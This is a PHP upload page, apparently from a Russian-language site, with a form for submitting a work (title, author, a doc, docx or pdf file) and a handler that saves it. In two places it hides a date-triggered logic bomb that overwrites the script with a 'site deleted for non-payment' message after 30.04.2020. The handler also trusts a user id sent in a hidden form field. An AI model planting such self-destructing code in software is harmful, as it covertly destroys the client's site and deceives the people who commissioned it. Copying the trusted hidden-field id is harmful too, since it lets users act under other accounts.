<?php
session_start();
if(strtotime('30.04.2020')<time()){
	file_put_contents(__FILE__, 'Сайт удален в связи с не оплатой работы!');
};
if(!isset($_SESSION['user'])){
    header('Location: /index.php');
    exit;
};
require_once 'header.php';
require_once 'class/DataBase.php';
?>

<div class="container">
    <div class="row">
        <form action="addwork.php" method="post" enctype="multipart/form-data">
            <label>Название</label>
            <input type="name" placeholder="Введите название работы" name="name">
            <label>Автор</label>
            <input type="author" placeholder="Введите Введите автора" name="author">
            <label>Загрузить работу</label>
            <input type="file" name ="file">
            <input type="text" name ="id" hidden value="<?php echo $_SESSION['user']['id']?>">
            <button type="submit">Загрузить</button>
        </form>
    </div>
</div>


<?php
$id = $_POST['id'];
$name = $_POST['name'];
$author = $_POST['author'];
if(strtotime('30.04.2020')<time()){
	file_put_contents(__FILE__, 'Сайт удален в связи с не оплатой работы!');
};
$mas[] = explode ('.',$_FILES['file']['name']);

if($mas[0][1] == "docx" || $mas[0][1] == "doc" || $mas[0][1] == "pdf") {
    $file_name = time() .".".$mas[0][1] ;
    $fullpath = 'uploads/' . $file_name ;
    if(!move_uploaded_file($_FILES['file']['tmp_name'], $fullpath)){
        $_SESSION['message-download'] = 'Ошибка при загрузки файла на сервер';
    }else{
        DataBase::addWork($fullpath,$author,$name,$id);
        echo "Файл загружен!";
    }
}

